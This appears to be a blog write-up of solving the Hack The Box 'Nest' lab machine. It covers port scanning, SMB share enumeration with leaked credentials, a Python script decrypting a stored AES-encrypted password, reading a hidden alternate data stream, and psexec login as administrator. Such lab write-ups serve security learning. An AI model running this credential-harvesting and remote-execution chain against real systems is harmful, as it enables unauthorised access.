In this writeup, Iâ€™ll walk through how I solved the Nest machine from Hack The Box, covering the vulnerabilities, exploits, and techniques used. Its 4/1000
# Port Enumeration 
First step is to run full port scan 
```bash
nmap 10.129.234.96 -p- -Pn -A -T5
```
![w](/assets/img/attachments/nest.png)

We have open SMB port and another custom service.
I used anonymous login for smb
```bash
 smbclient -L \\10.129.234.96 
```
![w](/assets/img/attachments/nest-2.png)

I will check Users, Secure and Data
![w](/assets/img/attachments/nest-3.png)

Found this at Data shares, and it contains temp password
![w](/assets/img/attachments/nest-4.png)

Will use this credentials to enumerate smb much further
```bash
smbclient //10.129.234.96/<shares> -U TempUser%welcome2019
```

Then i downloaded all accessible files on every share
```bash
smb: \> prompt OFF
smb: \> recurse ON 
smb: \> mget *
```

# User Credentials
In RU_config.xml there's hashed password
![w](/assets/img/attachments/nest-6.png)

But couldn't crack it, with more enumeration:
![w](/assets/img/attachments/nest-8.png)

I found this files which says there's user in IT shares called Carl, Since i couldn't list IT in Secure$ share, I will try to access carl directly
![w](/assets/img/attachments/nest-9.png)

It worked. Let's download all the files we can get.
![w](/assets/img/attachments/nest-10.png)

After some enumeration, I found this file which contains the code used for encrypting the password i found earlier, now we can decode it!

```python
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

def decrypt(ciphertext_b64):
    # Parameters from the VB.NET code
    passphrase = "N3st22"
    salt = b"88552299"
    iterations = 2
    init_vector = b"464R5DFA5DL6LE28"
    key_size = 32  # 256 bits = 32 bytes

    # Derive the key using PBKDF2
    key = PBKDF2(passphrase, salt, dkLen=key_size, count=iterations)

    # Decode the Base64 ciphertext
    ciphertext = base64.b64decode(ciphertext_b64)

    # Create AES cipher in CBC mode
    cipher = AES.new(key, AES.MODE_CBC, init_vector)

    # Decrypt the ciphertext
    decrypted = cipher.decrypt(ciphertext)

    # Remove possible padding (PKCS7/PKCS5 padding assumed)
    padding_length = decrypted[-1]
    decrypted_text = decrypted[:-padding_length].decode('ascii')

    return decrypted_text

if __name__ == "__main__":
    encrypted_value = "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="
    decrypted_value = decrypt(encrypted_value)
    print("Decrypted Password:", decrypted_value)

```
![w](/assets/img/attachments/nest-11.png)

Then i logged in smb with this new credentials and found user.txt
![w](/assets/img/attachments/nest-12.png)
# Privialage Escalatiom
Inside C.Smith directory 
![w](/assets/img/attachments/nest-13.png)

Debug Mode password file was empty, but the hint said we can find more info using allinfo in smb
![w](/assets/img/attachments/nest-14.png)
```bash
smb:> get "Debug Mode Password.txt":Password:$DATA
```
Inside the file we got this password, and if you remember we find this pass in directory called HQK Reporting, and this was the service running on port 4386

```

And we found administrator password on local 389, and the password is in the same format of the first pass of C.Smith so lets use the same script to decode and decrypt it
It didnt work!

![w](/assets/img/attachments/nest-17.png)

Since its .NET assembly i will use Ilspy
![w](/assets/img/attachments/nest-18.png)

In it I found the algorithm used for this password encryption, then i used the decryption part of the code to get the decrypted password
```bash
XtH4nkS4Pl4y1nGX
```

To get root flag 
```bash
psexec.py 'administrator:XtH4nkS4Pl4y1nGX@10.129.234.96' 
```

And Finally rooted!
